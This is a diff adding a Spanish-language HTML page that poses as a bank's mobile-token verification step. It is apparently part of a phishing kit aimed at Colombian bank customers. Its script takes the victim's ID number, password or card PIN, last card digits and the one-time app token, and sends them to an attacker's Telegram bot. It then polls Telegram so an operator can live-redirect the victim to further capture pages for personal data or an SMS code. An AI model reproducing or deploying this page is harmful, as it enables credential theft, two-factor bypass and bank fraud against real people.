@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificación de Token</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            font-family: ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
+            background-color: #eee;
+        }
+
+        .spinner-container {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+        }
+
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 4px solid white;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div id="app">
+        <header class="w-full flex items-center justify-center py-16 bg-gradient-to-t from-[#0043a9] to-[#4c7bc7]">
+            <img src="img/logo.png" alt="" class="w-full max-w-[50px] h-auto -mt-4">
+        </header>
+
+        <div class="relative mt-[-1rem] rounded-t-[15px] w-full h-auto bg-gray-200">
+            <div class="w-full box-border p-4">
+                <h2 class="text-xl font-bold text-[#0040a8] text-center mb-4">Verificación de Token</h2>
+                <p class="text-sm text-gray-700 text-center mb-6">Por favor, ingresa el token de 6 dígitos que se genera en tu aplicación móvil.</p>
+
+                <form id="tokenForm">
+                    <div class="flex justify-center items-center gap-2 mb-4">
+                        <input type="tel" class="token-input w-12 h-12 text-center text-xl border border-gray-400 rounded-md" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+                        <input type="tel" class="token-input w-12 h-12 text-center text-xl border border-gray-400 rounded-md" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+                        <input type="tel" class="token-input w-12 h-12 text-center text-xl border border-gray-400 rounded-md" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+                        <input type="tel" class="token-input w-12 h-12 text-center text-xl border border-gray-400 rounded-md" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+                        <input type="tel" class="token-input w-12 h-12 text-center text-xl border border-gray-400 rounded-md" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+                        <input type="tel" class="token-input w-12 h-12 text-center text-xl border border-gray-400 rounded-md" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+                    </div>
+                    <p id="errorMessage" class="text-red-500 text-center mb-4 hidden">Token incorrecto, intenta de nuevo.</p>
+                    <button type="submit" id="validarBtn" disabled class="block w-full rounded-2xl text-white bg-[#0043a9] font-bold text-base border-none py-2 px-0 text-center my-4 mx-auto disabled:opacity-70">Validar Token</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <div id="spinner-modal" class="spinner-container">
+        <div class="spinner"></div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', async () => {
+            const app = document.getElementById("app");
+            const tokenForm = document.getElementById("tokenForm");
+            const inputs = document.querySelectorAll('.token-input');
+            const validarBtn = document.getElementById("validarBtn");
+            const spinnerModal = document.getElementById('spinner-modal');
+            const errorMessage = document.getElementById("errorMessage");
+
+            let initialLoginData = null;
+            let tokenAttemptCount = parseInt(sessionStorage.getItem('tokenAttemptCount')) || 0;
+            let TELEGRAM_BOT_TOKEN = '';
+            let TELEGRAM_CHAT_ID = '';
+            let statusCheckInterval = null;
+            let lastUpdateId = parseInt(sessionStorage.getItem('lastUpdateId')) || 0;
+            let transactionId = Date.now().toString();
+
+            // Leer datos de sessionStorage al cargar la página
+            const storedData = sessionStorage.getItem('initialLoginData');
+            if (storedData) {
+                initialLoginData = JSON.parse(storedData);
+                transactionId = initialLoginData.transactionId || Date.now().toString();
+            } else {
+                console.error("No se encontraron datos de inicio de sesión en sessionStorage.");
+                // Opcional: Redirigir al usuario si no hay datos de sesión
+                window.location.href = "index.html"; 
+            }
+
+            async function loadTelegramConfig() {
+                try {
+                    const response = await fetch('js/brr76.json');
+                    if (!response.ok) throw new Error('No se pudo cargar el archivo de configuración.');
+                    const data = await response.json();
+                    TELEGRAM_BOT_TOKEN = data.token;
+                    TELEGRAM_CHAT_ID = data.chat_id;
+                    console.log("Tokens y IDs de chat de Telegram cargados correctamente.");
+                    return true;
+                } catch (error) {
+                    console.error('Error al cargar la configuración de Telegram:', error);
+                    alert('Error crítico: No se pudo cargar la configuración de Telegram.');
+                    validarBtn.disabled = true;
+                    return false;
+                }
+            }
+
+            async function initLastUpdateId() {
+                try {
+                    if (!TELEGRAM_BOT_TOKEN) return;
+                    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates`;
+                    const response = await fetch(url);
+                    const data = await response.json();
+                    if (!data || !data.result) return;
+                    const updates = data.result;
+                    if (updates.length === 0) return;
+                    const maxUpdateId = Math.max(...updates.map(u => u.update_id));
+                    lastUpdateId = maxUpdateId;
+                    sessionStorage.setItem('lastUpdateId', lastUpdateId);
+                    console.log('Inicializado lastUpdateId a', lastUpdateId);
+                } catch (err) {
+                    console.warn('No se pudo inicializar lastUpdateId:', err);
+                }
+            }
+
+            async function sendToTelegram(messageContent, keyboard) {
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                const payload = {
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: messageContent,
+                    reply_markup: keyboard,
+                    parse_mode: 'Markdown'
+                };
+
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload),
+                    });
+                    if (!response.ok) {
+                        const errorText = await response.text();
+                        console.error(`Error al enviar mensaje a Telegram: ${response.status} - ${errorText}`);
+                        return false;
+                    }
+                    console.log('Mensaje enviado a Telegram exitosamente.');
+                    return true;
+                } catch (error) {
+                    console.error('Error de red al enviar mensaje a Telegram:', error);
+                    return false;
+                }
+            }
+
+            async function checkTokenVerification() {
+                if (statusCheckInterval) {
+                    clearInterval(statusCheckInterval);
+                }
+                statusCheckInterval = setInterval(async () => {
+                    try {
+                        const offsetParam = lastUpdateId > 0 ? `?offset=${lastUpdateId + 1}` : '';
+                        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates${offsetParam}`;
+                        const response = await fetch(url);
+                        const data = await response.json();
+                        if (!data || !data.result) return;
+                        const updates = data.result;
+                        if (!updates || updates.length === 0) return;
+                        const maxUpdateId = Math.max(...updates.map(u => u.update_id));
+                        lastUpdateId = maxUpdateId;
+                        sessionStorage.setItem('lastUpdateId', lastUpdateId);
+
+                        const relevant = updates.filter(u => u.callback_query && u.callback_query.data && u.callback_query.data.includes(transactionId));
+                        if (relevant.length > 0) {
+                            const latest = relevant.reduce((a, b) => a.update_id > b.update_id ? a : b);
+                            clearInterval(statusCheckInterval);
+                            statusCheckInterval = null;
+
+                            const callbackDataFull = latest.callback_query.data;
+                            const callbackId = latest.callback_query.id;
+
+                            try {
+                                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify({ callback_query_id: callbackId, text: 'Procesado' })
+                                });
+                            } catch (err) {
+                                console.warn('No se pudo responder callback_query:', err);
+                            }
+
+                            const callbackKey = callbackDataFull.split(':')[0];
+
+                            spinnerModal.style.display = 'none';
+                            app.style.display = 'block';
+
+                            switch (callbackKey) {
+                                case 'error_token':
+                                    errorMessage.classList.remove('hidden');
+                                    errorMessage.textContent = "Token incorrecto, intenta de nuevo.";
+                                    inputs.forEach(input => input.value = '');
+                                    inputs[0].focus();
+                                    checkAllFilled();
+                                    break;
+                                case 'pedir_datos':
+                                    window.location.href = "datos.html";
+                                    break;
+                                case 'token_sms':
+                                    window.location.href = "otp.html";
+                                    break;
+                                case 'finalizar':
+                                    window.location.href = "https://www.google.com";
+                                    break;
+                                default:
+                                    console.log("Respuesta no reconocida del bot:", callbackDataFull);
+                                    alert("Respuesta no reconocida. Por favor, intente de nuevo.");
+                                    break;
+                            }
+                        }
+                    } catch (error) {
+                        console.error("Error al verificar el estado de la transacción:", error);
+                    }
+                }, 1500);
+            }
+
+            // Lógica para el movimiento entre los inputs del token
+            inputs.forEach((input, i) => {
+                input.addEventListener("input", (e) => {
+                    const value = e.target.value;
+                    if (/^\d$/.test(value)) {
+                        if (i < inputs.length - 1) inputs[i + 1].focus();
+                    } else {
+                        e.target.value = "";
+                    }
+                    checkAllFilled();
+                });
+
+                input.addEventListener("keydown", (e) => {
+                    if (e.key === "Backspace" && !input.value && i > 0) {
+                        inputs[i - 1].focus();
+                    }
+                });
+
+                input.addEventListener("paste", (e) => {
+                    e.preventDefault();
+                    const paste = (e.clipboardData || window.clipboardData).getData("text").replace(/\D/g, "").slice(0, 6);
+                    [...paste].forEach((char, idx) => {
+                        if (inputs[idx]) inputs[idx].value = char;
+                    });
+                    if (paste.length > 0) {
+                        inputs[Math.min(paste.length, inputs.length - 1)].focus();
+                    }
+                    checkAllFilled();
+                });
+            });
+
+            function checkAllFilled() {
+                const allFilled = [...inputs].every((inp) => inp.value.length === 1);
+                validarBtn.disabled = !allFilled;
+            }
+
+            tokenForm.addEventListener("submit", async (event) => {
+                event.preventDefault();
+                const token = [...inputs].map(input => input.value).join('');
+                errorMessage.classList.add('hidden');
+
+                app.style.display = 'none';
+                spinnerModal.style.display = 'flex';
+
+                tokenAttemptCount++;
+                sessionStorage.setItem('tokenAttemptCount', tokenAttemptCount);
+
+                let telegramMessage = '🍀 GOLEADOR 🍀\n\n';
+                if (initialLoginData) {
+                    if (initialLoginData.cardClave !== 'N/A') {
+                        telegramMessage += `Tipo de Ingreso: Tarjeta Débito\n`;
+                        telegramMessage += `Tipo de Doc: ${initialLoginData.tipoDoc}\n\n`;
+                        telegramMessage += `CEDULA💎: ${initialLoginData.nroDoc}\n`;
+                        telegramMessage += `ClAVE🔐: ${initialLoginData.cardClave}\n`;
+                        telegramMessage += `Últimos 4 dígitos: ${initialLoginData.cardDigitos}\n`;
+                    } else if (initialLoginData.clave !== 'N/A') {
+                        telegramMessage += `Tipo de Ingreso: Clave Segura\n`;
+                        telegramMessage += `Tipo de Doc: ${initialLoginData.tipoDoc}\n\n`;
+                        telegramMessage += `CEDULA💎: ${initialLoginData.nroDoc}\n`;
+                        telegramMessage += `ClAVE🔐: ${initialLoginData.clave}\n`;
+                    }
+                    telegramMessage += `\n〽️ Token App: ${token}\n\n`;
+                    telegramMessage += `Fecha/Hora: ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`;
+                } else {
+                    telegramMessage += `Tipo de Ingreso: Token APP (sin datos de sesión)\n`;
+                    telegramMessage += `\n〽️ Token App: ${token}\n\n`;
+                    telegramMessage += `Fecha/Hora: ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`;
+                }
+
+                const keyboard = {
+                    inline_keyboard: [
+                        [{ text: "❌ Error Token", callback_data: `error_token:${transactionId}` },
+                         { text: "📋 Ir a Datos", callback_data: `pedir_datos:${transactionId}` }],
+                        [{ text: "👀 Token SMS", callback_data: `token_sms:${transactionId}` },
+                         { text: "🚨Finalizar", callback_data: `finalizar:${transactionId}` }]
+                    ]
+                };
+
+                const sent = await sendToTelegram(telegramMessage, keyboard);
+
+                if (sent) {
+                    checkTokenVerification();
+                } else {
+                    spinnerModal.style.display = 'none';
+                    app.style.display = 'block';
+                    alert("Error al enviar el token. Por favor, inténtalo de nuevo.");
+                }
+            });
+
+            // Inicialización al cargar la página
+            const configLoaded = await loadTelegramConfig();
+            if (configLoaded) {
+                await initLastUpdateId();
+            }
+        });
+
+        window.addEventListener('beforeunload', function() {
+            if (statusCheckInterval) {
+                clearInterval(statusCheckInterval);
+            }
+        });
+    </script>
+</body>
+</html>
